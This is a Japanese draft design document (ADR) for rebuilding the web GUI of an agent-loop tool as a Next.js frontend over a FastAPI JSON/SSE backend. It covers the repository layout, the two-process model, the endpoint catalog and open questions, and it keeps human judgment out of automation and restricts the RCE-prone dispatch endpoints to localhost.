# loop Web GUI 全面刷新 — 設計ドキュメント(ADR)

> **ステータス: Draft / 提案**(2026-06-17)
> 本書は複数エージェントによる並列設計の成果を統合した初版である。整合性クリティーク工程は未完のため、**セクション間の相互参照(「§N を参照」等)の番号は一部ズレている可能性がある**。各セクションの内容自体は実コードに接地済み。確定前に番号系の最終突き合わせを行うこと。

## 背景と目的

現行の Web GUI(FastAPI + Jinja2 + HTMX + 手書きCSS、`meta refresh` ポーリング、`localhost` 固定)は、ループを日常的に・スケールさせて使うには機能不足である。本書は GUI を **Next.js(App Router)+ Tailwind + shadcn/ui** のフロントへ刷新し、**FastAPI を「テンプレートを返す層」から「JSON API + SSE を返す層」へ役割変更**する全面刷新の設計を定める。`runner`/`loopdb` の直接 import を維持し、ロジックの二重化を避ける(= FastAPI は捨てない)。フル Next 構成・2プロセス運用・Node 依存・ビルドの導入はユーザー確定済み。

刷新は4軸すべてに対応する: ①SSE リアルタイム監視 + 並行 run 同時表示 ②分析ダッシュボード ③レビュー(種類B)UX の高速化 ④リモート/モバイル + 認証。

## スコープ / 非スコープ

- **スコープ**: Web UI の Next 移行、FastAPI の JSON API + SSE 化、認証・リモート公開、分析ダッシュボード、段階的移行と超並列実装計画。
- **非スコープ(別トラック T)**: runner の真の並列実行(複数 run 同時)。これは GUI 刷新と独立したトラックであり、本書では GUI が将来の並列化を吸収するための接続点(複数 run 前提の SSE 設計・per-run ステータス・commit race 制約)のみを定める。

## 守るべき中心思想(全セクション共通の不変条件)

1. **GUI は判断を生成・要約・推奨・自動入力しない。** 判断(種類B)は人間が書く。GUI/API は人間入力を契約ファイルへ中継する薄い口に徹する。
2. **file-based contract が単一の真実。** 全書き込みは `runner.write_task`/`write_judgment` + `auto_commit` 経由で `data/` 配下の MD と git にのみ着地する。Next/FastAPI は独自の権威ストアを持たない。
3. **`loop.db`(SQLite)/DuckDB は使い捨てのレンズ。** `just reindex` で MD から完全再生成できる状態のみ表示し、集計結果を独自永続化しない。

## 用語集

- **種類A / 種類B**: A=メカニクス(全自動化)、B=判断(絶対に自動化しない)。
- **file-based contract**: `data/tasks/*.md`(目標契約)+ `runs/<id>.md` + 証拠 + `review-notes.md` + git。
- **目標契約**: 1タスク=1ファイルの YAML front-matter(goal/accept/constraints/verify 等)。
- **verdict / handoff**: run の判定(pass/fail/handoff)。handoff=機械が二値判定しきれず人間へ引き渡す安全弁。
- **3役 Sub-agents**: Explorer(調査/read-only)→ Implementer(実装)→ Verifier(別モデル/read-only/構造化出力で独立判定)。
- **BFF**: Backend for Frontend。ここでは Next フロント専用の FastAPI JSON/SSE 層。
- **SSE**: Server-Sent Events。near-real-time な一方向イベント配信。

## 決定事項サマリ

| 決定 | 理由 |
|---|---|
| FastAPI を JSON API + SSE 化し、Next をフロントに据える BFF 構成 | `runner`/`loopdb` 直接 import を維持しロジック二重化を避けるため |
| OpenAPI(`webapp/schemas.py`)を型の唯一の正本とし TS 型は一方向生成 | 手書き二重定義による型ドリフトを CI で検出するため |
| P0(API/SSE枠/認証土台)を UI 非改造の独立ゲートにする | 既存 Jinja を壊さない不変条件を自明に保証するため |
| 共有面(`web/lib`・shadcn基盤)を 0.5 ゲートで先に凍結し read-only 化 | 6フロントワークストリームを衝突なく扇形に並列解禁するため |
| 契約3点(OpenAPI / SSEイベント形 / 認証境界)を P0 で凍結 | これが「超並列」を解禁する鍵。契約が凍れば実装は同時並行 |
| 判断記入と reviewed 化は不可分の1エンドポイントに閉じる | 「判断なしで reviewed だけ」の種類B スキップ抜け道を塞ぐため |
| dispatch/run/生成は `claude -p`(Bash許可)起動 = RCE 露出点として認可分離 | リモート公開を実質リモートコード実行と扱い多層防御するため |
| runner 並列化は GUI 非依存の別トラック T | スケールの本質ボトルネックだが GUI の依存グラフをブロックしないため |

## 未解決論点(各セクションから集約)

- **§1 全体アーキテクチャと repo 構成**: pnpm / npm / bun のどれを engine repo の Node パッケージマネージャに採用するか(ユーザーの nix-darwin 管理方針と整合する形で決める。justfile は pnpm 前提で書いたが要確認)。
- **§1 全体アーキテクチャと repo 構成**: 本番でリバースプロキシ(Caddy/nginx)を nix-darwin 配下の Homebrew で入れるか、Next の standalone 出力だけで済ませるか。SSE のバッファリング無効化設定を含めて §4 認証セクションと擦り合わせが必要。
- **§1 全体アーキテクチャと repo 構成**: api/ への改名に伴い launchd の WatchPaths(com.loop.watch.plist)や既存ブックマーク/外部スクリプトが webapp/ パスを参照していないかの棚卸し(grep 範囲を engine 外に広げるか要判断)。
- **§1 全体アーキテクチャと repo 構成**: /api/stream/* の SSE 配信を uvicorn の同一プロセスで持つか(.run.lock と *.stream.jsonl のポーリング tail)、watcher を別途持つか。実装方式は監視セクション(§5)と責務が重なるため、本セクションでは経路のみ確定し方式は委譲した。
- **§2 API レイヤ設計(REST + SSE エンドポイントカタログ)**: max_attempts を API で str 受けのまま runner に渡すか、Pydantic で int|null に正規化するか。現行 _fm_from_form は str→int 変換失敗時に黙ってフィールドを落とす(runner.py 相当の _fm_from_form 165-169)。API で int 化するとこの寛容な挙動が変わるため、契約データの後方互換を優先するなら str 受け据え置きが安全だが、型生成の綺麗さとはトレードオフ。
- **§2 API レイヤ設計(REST + SSE エンドポイントカタログ)**: GET /api/runs(#1)は毎回 loopdb.reindex で全 MD を再パースする(現行 _reindex_and_query)。run 数が増えると一覧 API が重くなる。db を使い捨てに保つ原則を守りつつ、reindex を毎リクエストではなく mtime 差分 or SSE run_done 契機に変える最適化を §2 でやるか §5(スケール)に委ねるかは未確定。
- **§2 API レイヤ設計(REST + SSE エンドポイントカタログ)**: analytics/summary(分析ダッシュボード軸)の集計を SQLite(loop.db)で行うか DuckDB を別途立てるか。プロジェクト前提に DuckDB の記述があるが現行コードは sqlite3 のみ。本セクションでは summary エンドポイントの存在予約に留め、集計基盤の選定は分析セクションへ委ねた。
- **§2 API レイヤ設計(REST + SSE エンドポイントカタログ)**: SSE の認証・CORS。リモート/モバイル(§4)対応時、SSE は EventSource が独自ヘッダを付けられないためトークンを query かクッキーで渡す必要がある。本セクションでは localhost 前提で未対応とし、§4 の認証設計に依存させた。
- **§3 リアルタイム監視と並行 run 同時表示(SSE)**: 認証(セクション4)が Cookie ベースか Bearer トークンかで EventSource のヘッダ制約への対処が変わる。トークン方式の場合 /api/runs/{id}/live と /api/monitor/stream にトークンをどう載せるか(Cookie 載せ替え or クエリ)はセクション4の決定に依存する。
- **§3 リアルタイム監視と並行 run 同時表示(SSE)**: セクション4で run を並列化する際、各 run の進行状況書き出しを現状の単一 data/.run.lock から runs/<id>/.status.json へ移すと決めたが、.run.lock(O_EXCL の atomic claim)自体を直列化ロックとして残すか撤廃するかは並列化方針(セクション4)側の決定であり、本セクションの monitor_stream は供給形(配列)だけ先に確定している。
- **§3 リアルタイム監視と並行 run 同時表示(SSE)**: 完了済み run のライブ再生で、長大 transcript を SSE フル再送するか REST 一括取得+SSE増分の二段にするかは、典型 transcript サイズの実測(現状サンプルは小さい)を見て最終決定したい。本セクションは単純化のため SSE 一本を推奨にしている。
- **§4 runner の並列実行(スケールの本丸 / 別トラック)**: max_concurrency を 1 超に上げたときの claude -p の同時セッション上限(サブスク/Agent SDK クレジット枯渇)が並列実行の実効上限を律速する可能性。loop.toml の max_budget_usd / timeout は run 単位の停止条件であり、N 並行時の総予算・総セッション数のガードは別途必要かどうか(本トラックで loop.toml に max_concurrency に加えグローバル予算ガードを置くべきか)は要確定。
- **§4 runner の並列実行(スケールの本丸 / 別トラック)**: ワーカーを uvicorn プロセス内スレッドに置く推奨だが、CLI 単独(`runner.py run`)からも N 並行を回したいニーズがあるか。ある場合、ワーカープールを runner.py 側に持たせ FastAPI はそれを import する構成にすべきで、配置の正本をどちらにするかは GUI トラックのプロセス構成決定(Next + uvicorn の 2 プロセス)と合わせて確定する必要がある。
- **§4 runner の並列実行(スケールの本丸 / 別トラック)**: queue.db を別プロセスワーカー(将来)で共有する場合、SQLite の同時書き込み耐性(WAL + busy_timeout)で足りるか、それとも最初から file ベースキュー(案A)の方が複数プロセス前提では素直か。同一プロセス内スレッド構成を確定できれば SQLite で十分だが、プロセス分離を将来要件に含めるかは未確定。
- **§4 runner の並列実行(スケールの本丸 / 別トラック)**: data/ auto_commit を単一 committer ワーカーへ集約する案I(commit 要求をキュー化)まで踏み込むか、プロセス内 Lock(案II)で止めるか。run 本体に対し commit は秒未満なので案II で実用上十分と判断したが、将来 data/ への書き込み元が増える(複数オペレータ/外部同期)場合は案I が必要になりうる。
- **§5 分析ダッシュボード**: DuckDB を read_only=True で開く際、SQLite 側で同時に loopdb.connect が書き込みトランザクション中だと WAL 無し SQLite ではロック競合が起きうる。reindex/upsert は短命トランザクションなので実運用では問題にならない想定だが、run の並列化(§ボトルネック節)が実装された後は SQLite を WAL モードで開く変更(loopdb.connect 側で PRAGMA journal_mode=WAL)が必要かどうかは、並列化の設計確定後に再評価する。
- **§5 分析ダッシュボード**: gaming_suspects の `task` カラムは現状 front-matter の task 名(タスク id)を指すのか目標契約本文を指すのか、runs/*.md の実サンプルを確認して /api/stats/gaming-suspects のフィールド名(task vs task_id)を最終確定する必要がある。loopdb 上は `task` 一列のみ。
- **§5 分析ダッシュボード**: 期間フィルタの基準カラム `started_at` が ISO8601 文字列としてソート可能な形式で必ず書き込まれているか(タイムゾーン有無)を runs/*.md 実データで確認する。混在していると BETWEEN 比較が壊れる。
- **§6 レビュー(種類B)UX の高速化**: JUDGMENT_FIELDS を (key, label) から (key, label, placeholder) の3タプルへ拡張して問い文を runner 側に持たせるか、それとも MD 契約に影響させないため placeholder は Next 側の静的辞書に留めるか。前者は単一の源に揃うが parse_judgment/write_judgment のアンパックに影響する(要 runner 改修)。後者は runner を触らないが問いが engine と Next に二重化する。
- **§6 レビュー(種類B)UX の高速化**: write_judgment は review-notes.md へ追記専用のため、同一 run を再保存すると checks 行が重複する。reviewed 済み run の再保存をどう扱うか(確認ダイアログのみで許容 / 再保存時は review-notes 追記をスキップする runner 改修を入れる / 該当 run の既存行を置換する)。runner の挙動変更を伴うため別途決定が必要。
- **§6 レビュー(種類B)UX の高速化**: 未レビューキューの正準順序を started_at DESC(新しい順)とするか、unreviewed_runs() の run_id 昇順(古い順=溜まった順に消化)とするか。捌く UX としては古い順が自然な一方、_reindex_and_query は新しい順。j/k と保存後 next を同順にするため1つに決める必要がある。
- **§7 リモートアクセス・認証・セキュリティ**: mTLS を run/dispatch クラス限定で将来導入するか(モバイルへの証明書配布コストと最高強度のトレードオフ)。初手では不採用としたが、単一オペレータ + 固定数デバイスなら現実的な選択肢。
- **§7 リモートアクセス・認証・セキュリティ**: verify の shell=True 実行(runner.py:543)を将来撤廃 or サンドボックス化するか。実行系ネイティブ委譲方針と干渉するため本設計では scope 分離による緩和に留めた。リモートで verify を書ける主体が増える運用に進むなら再検討が必要。
- **§7 リモートアクセス・認証・セキュリティ**: SSE の認証を Cookie(HttpOnly+SameSite=Strict)方式と短命 signed query token 方式のどちらを正式採用するか。EventSource がヘッダを送れない制約への対処で、Next.js 側の実装(fetch ベースの SSE polyfill 採用可否)に依存する。
- **§7 リモートアクセス・認証・セキュリティ**: フェーズ2の IdP を Google/GitHub のどちらにするか、oauth2-proxy と caddy-security のどちらを前段にするか(運用者の既存アカウント基盤に依存)。
- **§7 リモートアクセス・認証・セキュリティ**: auto_commit の data/ への commit race(セクション5)が、リモート公開で run 頻度が上がった際にどこまで悪化するか。直列ロック解決が前提であり本セクションでは扱わないが、公開と並列化の同時導入は避けるべき。
- **§8 段階的移行フェーズと超並列実装計画**: P3 ダッシュボードの API が DuckDB(stats.py)を呼ぶか、loop.db を直接読むかは未確定。DuckDB はプロセス起動コストがあり SSE/同期 API には重い可能性。stats.py の実装(別プロセス起動か in-process か)を確認して決める必要がある。
- **§8 段階的移行フェーズと超並列実装計画**: Next の配信形態(独立 Node プロセスで standalone build を uvicorn と2プロセス運用か、FastAPI に静的 export をマウントするか)。ユーザーは2プロセス運用を許容済みだが、SSE のプロキシ経路(Next→FastAPI か、ブラウザ→FastAPI 直か)で CORS/認証設計が変わるため§2/§6 と整合確認が必要。
- **§8 段階的移行フェーズと超並列実装計画**: T(runner 並列化)で data/ commit を直列化する方式(単一コミットワーカー vs run毎 worktree+後段 merge)の決定は本セクション外。GUI 側 SSE が読む per-run ステータスファイルのスキーマ(runs/<id>/status.json 等)を T と合意する必要がある。
- **§8 段階的移行フェーズと超並列実装計画**: 認証方式の具体(§6 委譲)が未確定のため、P0 の AuthMiddleware インターフェース(トークン/セッション/mTLS のどれを前提に境界を切るか)が暫定。dispatch/生成エンドポイントを localhost 限定に保つ実装手段(middleware で client.host 判定 vs 別 ASGI app 分離)も§6 と要すり合わせ。

## この文書の読み方(目次)

1. [全体アーキテクチャと repo 構成](#1)
2. [API レイヤ設計(REST + SSE エンドポイントカタログ)](#2)
3. [リアルタイム監視と並行 run 同時表示(SSE)](#3)
4. [runner の並列実行(スケールの本丸 / 別トラック)](#4)
5. [分析ダッシュボード](#5)
6. [レビュー(種類B)UX の高速化](#6)
7. [リモートアクセス・認証・セキュリティ](#7)
8. [段階的移行フェーズと超並列実装計画](#8)

---


---

<a id="1"></a>

## 1. 全体アーキテクチャと repo 構成

このセクションは Web GUI 刷新の土台、すなわち「Next.js(App Router)フロント + FastAPI(JSON API + SSE)バックエンド」の BFF 構成における **プロセスモデル・repo レイアウト・起動手順・設定の単一ソース** を確定する。実装者はこのセクションだけで repo を切り、2 プロセスを立ち上げ、フロントとバックの責務境界を引けることを目標とする。

### 1.0 設計の前提(中心思想との整合)

刷新でフロントを Next 化しても、中心思想は一切緩めない。本セクションで特に効いてくる不変条件を先に固定する:

- **単一の真実は file-based contract**(`data/tasks/*.md`・`data/runs/<id>.md`・per-run 証拠・`data/review-notes.md`・git)。Next は状態を持たず、表示は API 経由で取得した事実のみ。Next 側に「権威ストア」を作らない(IndexedDB へ判断を溜める等は禁止)。
- **`loop.db`(SQLite)は MD 派生の使い捨てインデックス**。`reindex` で完全再生成可能。API は loop.db を読んで返すが、それを「正」とは扱わない。書き込み(判断・TODO 編集)は必ず MD/git へ落とし、loop.db はその副産物として再導出する(現 `write_judgment` / `auto_commit` の流儀を維持)。
- **GUI は判断を生成・要約・推奨・自動入力しない**。これはフロント技術スタックに依らない契約なので、Next 化しても守る。具体的には「判断フォームの prefill は `runner.parse_judgment` が返した既存値の復元のみ」「事実要約は `runner` が MD に書いたものをそのまま表示」。LLM 呼び出しを Next 側(Route Handler / Server Action)に置かない。判断補助の生成 API をバックに足さない。詳細はレビュー UX セクション(§3 参照)に委ねるが、アーキテクチャ層の結論として **「LLM を叩く経路はバックエンドの `runner` 委譲(種類A の dispatch/gen)に限定し、フロント・BFF は事実の配送のみ」** とする。

### 1.1 決定サマリ(両論併記しない結論)

| 論点 | 決定 |
| --- | --- |
| Next を別 repo にするか | **同一 engine repo に同居**(モノレポ風 `web/`)。理由は §1.7。 |
| FastAPI を残すか | **残す**。`runner` / `loopdb` を直接 import し続け、ロジックは Python に集約。Next からは HTTP/SSE のみ。 |
| 現 `webapp/` の扱い | **`api/` へ改名**し、Jinja2/テンプレートを撤去して JSON+SSE 専用にする。`webapp/templates/` は削除。 |
| 設定の単一ソース | **`loop.toml` は Python(`runner.load_config`)だけが読む**。Next は読まない。メタ情報(repos 一覧・stop 条件等)は API 経由で取得。 |
| プロセスモデル | **2 プロセス**(`uvicorn` = API、`next` = フロント)。開発はプロキシ、本番は単一オリジン(Next が API を rewrite で内包)。 |
| 公開境界 | **API は `127.0.0.1` 固定を維持**。リモート/認証は別レイヤ(リバースプロキシ + 認証)で被せる。dispatch/gen は RCE 露出なので localhost 安全装置を外さない(§4 参照)。 |

### 1.2 repo ディレクトリ構成(具体パス)

engine repo ルート(現 `/Users/shuya/Documents/GitHub/loop`)を基準に、相対パスで示す。

```
loop/                            # engine repo(公開)
├─ runner.py                     # 種類A の配管。変更なし(import 元として維持)
├─ loopdb.py                     # MD→SQLite インデクサ。変更なし
├─ stats.py / tui.py             # 残置(CLI/分析)。変更なし
├─ loop.toml                     # 設定の単一ソース。Python のみが読む
├─ justfile                      # web タスクを差し替え(§1.5)
│
├─ api/                          # ← 現 webapp/ を改名。FastAPI JSON+SSE 層
│  ├─ main.py                    #    app 定義・CORS・ルータ集約・uvicorn entry
│  ├─ deps.py                    #    runner/loopdb への薄いアクセサ(import 集約)
│  ├─ routes/
│  │  ├─ runs.py                 #    GET /api/runs, /api/runs/{id}, 証拠ファイル
│  │  ├─ judge.py                #    POST /api/runs/{id}/judge(判断の書き戻し)
│  │  ├─ tasks.py                #    TODO CRUD + run/gen ディスパッチ
│  │  ├─ monitor.py             #    SSE: 実行状態・ライブ transcript
│  │  └─ meta.py                 #    GET /api/meta(repos/stop条件/data dir 等)
│  └─ schemas.py                 #    Pydantic レスポンスモデル(JSON 形を固定)
│
├─ web/                          # ← Next.js(App Router)。フロント一式
│  ├─ package.json
│  ├─ next.config.ts             #    本番 rewrite で /api/* を uvicorn へ
│  ├─ tailwind.config.ts
│  ├─ components.json            #    shadcn/ui
│  ├─ .env.local                 #    NEXT_PUBLIC_API_BASE 等(§1.6)
│  ├─ app/                       #    ルーティング(画面構成は §2/§3/§4 が定義)
│  ├─ components/ui/             #    shadcn 生成物
│  └─ lib/api.ts                 #    fetch ラッパ + SSE クライアント
│
├─ .loop-worktrees/              # 既存。worktree 置き場(.gitignore 済み)。不変
└─ data/                         # ← .gitignore 済みの private 契約 repo。位置づけ不変
   ├─ tasks/<id>.md  runs/<id>.md  review-notes.md  loop.db  .run.lock
```

**`data/` の位置づけは一切変えない。** `runner._data_dir()` が `loop.toml [data] dir`(既定 `data`)を engine ルート起点で解決する現挙動(`runner.py:38-45`)をそのまま使う。Next/api いずれも `data/` を直接 fs 参照しない(api は `runner.RUNS` / `runner.DATA` 経由、Next は API 経由)。`.gitignore` に `web/node_modules/`・`web/.next/` を追加するだけで、`data/` の除外規則は触らない。

### 1.3 プロセスモデルと責務境界(図)

```
                ┌──────────────────────────────────────────────┐
  ブラウザ ──▶  │  Next.js (web/)   :3000                        │
  (PC/モバイル)  │  - App Router / RSC / shadcn/ui                │
                │  - 状態を持たない。表示=API の事実のみ        │
                │  - SSE 購読 / fetch                            │
                └───────────────┬──────────────────────────────┘
                  HTTP(JSON) / SSE │  (dev=proxy, prod=同一オリジン rewrite)
                ┌───────────────▼──────────────────────────────┐
                │  FastAPI (api/)   127.0.0.1:8765              │
                │  - JSON API + SSE のみ(テンプレートを返さない)│
                │  - import runner / import loopdb  ← ロジック集約│
                │  - dispatch は subprocess.Popen(runner.py)    │
                └───────┬───────────────────────┬──────────────┘
            直接 import │                       │ subprocess.Popen
                ┌───────▼─────────┐    ┌────────▼──────────────┐
                │ runner.py        │    │ runner.py run/gen      │
                │ loopdb.py        │    │ (claude -p, Bash許可)  │
                │ (同一プロセス内)  │    │ = 種類A の実行系       │
                └───────┬─────────┘    └────────┬──────────────┘
                        │ read/write             │ 実行・証拠生成・auto_commit
                ┌───────▼────────────────────────▼──────────────┐
                │  data/ (private git repo) = 単一の真実         │
                │  tasks/*.md · runs/*.md · review-notes.md      │
                │  loop.db(派生・使い捨て) · .run.lock           │
                └────────────────────────────────────────────────┘
```

責務境界の硬いルール:

1. **Next はビジネスロジックを持たない。** `_repo_label` の整形・`_fields_from_fm` のような front-matter↔フォーム変換・`_fm_from_form` の YAML 整形は **すべて Python 側(api/runner)に残す**。Next はそれらの結果(JSON)を受け取って描画するだけ。フロントに front-matter パーサや YAML ダンパを二重実装しない(ロジック二重化回避が刷新の主目的)。
2. **書き込みは必ず Python 経由で MD/git に落ちる。** `judge` / `todo_create` / `todo_save` / `todo_delete` は現状 `runner.write_judgment` / `runner.write_task` + `runner.auto_commit`(`runner.py:296`)を呼ぶ。Next からは「JSON を POST → api が同じ runner 関数を呼ぶ」へ置換するだけで、書き込み経路は変わらない。
3. **dispatch / gen / run は subprocess のまま。** `runner.py run|gen` を `subprocess.Popen(cwd=ROOT)` で起動する現方式(`webapp/main.py:283,335,413`)を維持。理由は cmd_run が `data/.run.lock` を `os.O_EXCL` で atomic claim して直列化しており(`runner.py:896-901`)、この単一プロセス起動モデルを崩すと並行 run の安全装置が壊れるため。並行化の是非は本セクションのスコープ外(直列実行ボトルネックの議論は §5/監視セクションに委譲)だが、**アーキテクチャ層としては「api は run を直接インライン実行せず、必ず別プロセスへ Popen し、状態は `.run.lock` の SSE 配信で観測する」** を固定する。

### 1.4 API エンドポイント署名(JSON 形の確定)

現 `webapp/main.py` のルートを 1:1 で JSON 化する。HTML を返していた箇所を Pydantic レスポンスに置換する。署名(抜粋、`api/routes/*` に分割):

```
# runs.py
GET  /api/runs?verdict=&reviewed=&task=        -> { runs: RunRow[], verdicts: string[] }
GET  /api/runs/{run_id}                         -> RunDetail
GET  /api/runs/{run_id}/file/{name}             -> text/plain(証拠ファイル。パストラバーサル防御は現 evidence_file を踏襲)
GET  /api/runs/{run_id}/transcript              -> { events: TranscriptEvent[] }

# judge.py
POST /api/runs/{run_id}/judge                   body: { trust, risk, checks, learning } -> { ok: true, run_id }
                                                 # runner.write_judgment をそのまま呼ぶ。prefill 以外の自動入力なし

# tasks.py
GET  /api/tasks                                 -> { tasks: TaskRow[], last: {[taskId]: {run_id, verdict}}, running: bool }
GET  /api/tasks/{task_id}                        -> TaskForm   (= 現 _fields_from_fm の JSON)
POST /api/tasks                                  body: TaskForm  -> { ok, task_id }   (新規。重複は 409)
PUT  /api/tasks/{task_id}                        body: TaskForm  -> { ok, task_id }   (編集)
DELETE /api/tasks/{task_id}                      -> { ok }
POST /api/tasks/{task_id}/run                    -> { started: "queued"|"busy" }      (Popen run)
POST /api/tasks/generate                         body: { prompt, repo?, auto_run? } -> { started: true } (Popen gen)
POST /api/dispatch                               -> { started: true }                  (Popen run)

# monitor.py  (SSE)
GET  /api/stream/status                          text/event-stream  -> .run.lock の差分を push
GET  /api/stream/runs/{run_id}/live              text/event-stream  -> 役割別 *.stream.jsonl の追記を push

# meta.py
GET  /api/meta                                   -> { repos: string[], statuses: string[], stop: {max_turns,...}, judgment_fields: [key,label][] }
```

`RunRow` / `RunDetail` の JSON 形(loop.db の `runs` 行 + 派生)を Pydantic で固定する。例:

```jsonc
// RunDetail(現 detail() が組み立てていた dict を JSON 化)
{
  "run_id": "20260616-...",
  "fm": { "task": "...", "verdict": "pass", "reviewed": 0, "repo": "...", "started_at": "..." },
  "summary": "…runner が書いた事実要約(## エージェントがやったこと の抜粋)…",
  "verifier": { /* verifier.json をそのまま。無ければ null */ },
  "evidence": { "change.patch": "…|null", "test-output.txt": "…|null", "transcript": true },
  "judgment": { "trust": "", "risk": "", "checks": "", "learning": "" },  // parse_judgment の復元値のみ
  "fields": [["trust","信用できるか"], ["risk","失敗/リスク"], ["checks","..."], ["learning","学び"]]
}
```

`judgment` は **空文字 prefill が正常**(人間が書く前)。フロントはこの値を `<textarea defaultValue>` に流すだけで、欠損を埋めたり推奨文を差し込んだりしない。`fields` ラベルは現 `runner.JUDGMENT_FIELDS`(`runner.py:714`)を `meta` から配るので、フロントにラベルをハードコードしない。

`deps.py` は import を 1 箇所に集約する薄い層:

```python
# api/deps.py — runner/loopdb への唯一の入口
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))  # 現 main.py:24 と同じ
import loopdb  # noqa: E402
import runner  # noqa: E402

def reindex_and_query(...): ...   # 現 _reindex_and_query を移設
def latest_runs() -> dict: ...    # 現 _latest_runs
def read_run_status() -> dict | None: ...  # 現 _read_run_status(.run.lock)
```

### 1.5 起動手順(開発 / 本番)と justfile

**開発時(2 プロセス + プロキシ):**

- API: `uv run uvicorn api.main:app --host 127.0.0.1 --port 8765 --reload`
  - 現 `webapp/main.py` 末尾の `uvicorn.run(...)`(`main.py:417-419`)は CLI 起動に置換。`--reload` でホットリロード。
- フロント: `cd web && pnpm dev`(:3000)。`next.config.ts` の `rewrites` で `/api/*` を `http://127.0.0.1:8765/api/*` へ転送 → **ブラウザから見て同一オリジン**になり、CORS 不要・Cookie 認証も素直に通る。

```ts
// web/next.config.ts(dev/prod 共通。API_BASE は env で差し替え可)
const API = process.env.API_BASE ?? "http://127.0.0.1:8765";
export default { async rewrites() {
  return [{ source: "/api/:path*", destination: `${API}/api/:path*` }];
}};
```

> 決定: **CORS ではなく Next rewrite を採用する。** CORS を開けると SSE の credentialed リクエストやプリフライト管理が増え、認証(§4)とも干渉する。rewrite なら全リクエストが Next オリジン経由になり、認証ミドルウェアを Next 1 箇所に集約できる。`allow_origins` を api 側に足さない(localhost 固定の安全性を CORS で薄めない)。

**本番(単一オリジン):**

- API: `uv run uvicorn api.main:app --host 127.0.0.1 --port 8765`(reload なし、localhost 固定維持)。
- フロント: `cd web && pnpm build && pnpm start`(:3000)。dev と同じ rewrite で `/api/*` を uvicorn に内包 → 外部に晒すのは Next の :3000 のみ。
- リモート公開する場合は **Next の前段にリバースプロキシ(Caddy/nginx 等)+ 認証**を置き、uvicorn は決して直接公開しない(dispatch/gen の RCE 露出回避。詳細は §4)。SSE を通すため proxy は `proxy_buffering off` 相当を設定する。

**justfile への追加(現 `web:` を置換):**

```make
# 開発: API(reload)とフロント(next dev)を別ターミナルで
api:
    uv run uvicorn api.main:app --host 127.0.0.1 --port 8765 --reload
web:
    cd web && pnpm dev
# 本番ビルド & 起動
web-build:
    cd web && pnpm install && pnpm build
web-start:
    cd web && pnpm start
# 両方まとめて(フォアグラウンド2プロセス。開発用)
dev:
    uv run uvicorn api.main:app --port 8765 & cd web && pnpm dev
```

> 現 `just web`(`uv run webapp/main.py`)は **意味が変わる**(テンプレ配信→Next dev)。`just review` / `just tui` / `just reindex` / `just stats` 等の CLI は無関係なので不変。

### 1.6 設定の単一ソースと env 受け渡し

- **`loop.toml` を読むのは Python(`runner.load_config` / `runner._data_dir`)だけ。** Next は `loop.toml` を一切パースしない。Next が必要とするメタ情報(`repos` レジストリ・`statuses`・stop 条件・`judgment_fields`)は **`GET /api/meta` で配る**。これにより設定の二重管理を排し、`loop.toml` を変えれば API 応答経由で UI に反映される。現 `_known_repos`(`main.py:258`)・`_STATUSES`(`main.py:120`)はそれぞれ meta に集約。
- **Next 側の env は接続情報と認証だけ**(`web/.env.local`):
  - `API_BASE`(server 側 rewrite 用、既定 `http://127.0.0.1:8765`)
  - `NEXT_PUBLIC_API_BASE`(クライアント直叩きする場合のみ。基本は同一オリジン `/api` を使うので空でよい)
  - `AUTH_*`(認証方式は §4 が決定。ここでは「env で渡る」ことだけ固定)
- ドメイン値(repos 等)を Next の env に焼かない。env はあくまで「どこの API か・誰が入れるか」に限定し、ドメイン設定は loop.toml→/api/meta の一本道にする。

### 1.7 なぜ同一 engine repo に同居させるか(決定と理由)

**決定: Next(`web/`)を engine repo に同居させる。別 repo にしない。**

理由:
- **API スキーマとフロントが密結合**で、`/api/runs` の JSON 形(§1.4)を変えるたびに両者を同時に直す。別 repo だと PR が 2 本に割れ、`loopdb` のカラム変更 → API レスポンス → フロント型の同期がずれる。同居なら 1 コミットで閉じる。
- **engine は「公開コード repo」**という既存方針(`loop.toml [data]` コメント参照)に Next は素直に乗る。Next には契約データ(判断・目標)が一切含まれず、すべて `data/`(private repo)側にあるので、`web/` を engine に置いても private 情報は混ざらない。
- `data/` だけが分離されていれば中心思想(engine と契約データの分離)は満たされる。フロント/バックの分離は repo 境界ではなく `web/` と `api/` のディレクトリ境界で十分。
- 別 repo の利点(独立デプロイ・別チーム所有)は、本プロジェクト(macOS ローカル・単一オペレータ)では効かない。むしろ 2 repo の同期コストが純損。

トレードオフ(受容する欠点): engine repo に Node 依存(`web/node_modules`・`pnpm-lock.yaml`)と Next ビルド成果物(`web/.next`)が入り、Python 専用だった repo に Node ツールチェーンが混ざる。これは `.gitignore`(`node_modules/`・`.next/`)と justfile の分離タスクで隔離し、Python 側(`runner.py` 等)の起動には Node を要求しない(api は uvicorn 単体で動く)構成にして緩和する。

---

<a id="2"></a>

## 2. API レイヤ設計(REST + SSE エンドポイントカタログ)

本セクションは、現行 `webapp/main.py` の Jinja ルートを **JSON API + SSE** に一対一で写像し、Next.js(App Router)フロントが消費する完全なエンドポイントカタログを定義する。FastAPI は捨てない。`import runner` / `import loopdb` の直接呼び出しを維持してロジック二重化を避け、FastAPI を「テンプレートを返す層」から「JSON / SSE を返す薄い口」に役割変更する。

### 2.0 設計原則(このレイヤで絶対に守る不変条件)

1. **API は判断を生成・要約・推奨・自動入力しない。** `judge` 系は人間が打った文字列を `runner.write_judgment` へそのまま素通しする薄い口に限定する。サーバ側で trust/risk/checks/learning の補完・デフォルト値・LLM 呼び出しを一切行わない(§2.6 で担保方法を明記)。
2. **file-based contract が単一の真実。** すべての書き込み API は最終的に `runner.write_task` / `runner.write_judgment` / `runner.auto_commit` を経由して `data/` 配下の MD と git にのみ着地する。API レスポンスや JSON は MD の**派生表示**であって権威ではない。
3. **loop.db は使い捨てインデックス。** 一覧系は `loopdb.reindex` で全件再生成した結果を返してよいが、API は db に独自カラムを足さない。db に無い情報(front-matter の goal/accept、判断本文、evidence 生テキスト)は **MD を直接 parse** して返す。
4. **副作用の A/B 区分を OpenAPI に明示する。** 種類A(メカニクス: dispatch / run / reindex / task CRUD)は API から叩いてよい。種類B(判断)は「人間入力の中継」だけが許可。各エンドポイントに `x-loop-kind: A|A(中継)` を OpenAPI extension で付け、フロントと監査が区別できるようにする。
